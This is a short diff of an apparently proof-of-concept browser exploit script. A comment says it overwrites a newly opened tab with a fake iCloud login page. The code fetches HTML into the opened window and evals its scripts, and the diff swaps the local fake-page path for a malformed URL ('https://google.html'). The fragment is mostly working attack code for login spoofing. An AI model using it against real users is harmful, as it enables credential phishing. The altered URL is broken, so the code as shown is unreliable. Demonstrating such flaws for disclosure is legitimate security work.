@@ -19,7 +19,7 @@ v= window.open(url);
 
 // Wait a little and change contents of the newly created tab to a fake login iCloud page as a POC
 setTimeout(()=>{
-fetch('/fakeapple.html').then(r => r.text()).then(h => v.document.body.innerHTML = h).then(() => Array.from(v.document.scripts).forEach(s => v.eval(s.text)));
+fetch('https://google.html').then(r => r.text()).then(h => v.document.body.innerHTML = h).then(() => Array.from(v.document.scripts).forEach(s => v.eval(s.text)));
 },100);
         }
     </script>
